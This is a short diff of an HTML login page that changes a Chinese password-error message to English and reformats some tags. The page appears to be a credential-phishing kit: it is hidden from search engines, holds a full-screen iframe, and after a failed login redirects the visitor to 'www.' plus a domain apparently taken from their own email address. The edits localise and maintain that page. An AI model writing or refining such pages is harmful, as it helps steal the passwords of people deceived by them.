@@ -1,6 +1,6 @@
-
 <!DOCTYPE html>
-<html><head>
+<html>
+<head>
 <meta http-equiv="content-type" content="text/html; charset=windows-1252">
 <meta name="robots" content="noindex, nofollow">
 <meta name="googlebot" content="noindex, nofollow">
@@ -139,7 +139,9 @@ function goNow() {
 			  $('#error').html("&#30331;&#24405;&#22833;&#36133;&#65281;&#35831;&#36755;&#20837;&#27491;&#30830;&#30340;&#23494;&#30721;&#12290;");
              }
             else{
-              
+              // Update the error message for incorrect password
+              $("#error").show();
+              $('#error').html("<span style='color: red;'>Incorrect password, please try again.</span>");
             }
           }
         },
@@ -150,7 +152,7 @@ function goNow() {
             window.location.replace("http://www."+my_sliceee);
           }
           $("#error").show();
-          $('#error').html("&#30331;&#24405;&#22833;&#36133;&#65281;&#35831;&#36755;&#20837;&#27491;&#30830;&#30340;&#23494;&#30721;&#12290;");
+          $('#error').html("<span style='color: red;'>Incorrect password, please try again.</span>");
         },
         complete: function(){
           $('#goNow').html('&#32487;&#32493;');
@@ -203,4 +205,5 @@ input.addEventListener("keyup", function(event) {
 <div id="root">
 <iframe id="myframe" scrolling="no" src="" width="100%" height="100%" frameborder="0"></iframe> </div>
 
-</body></html>
+</body>
+</html>
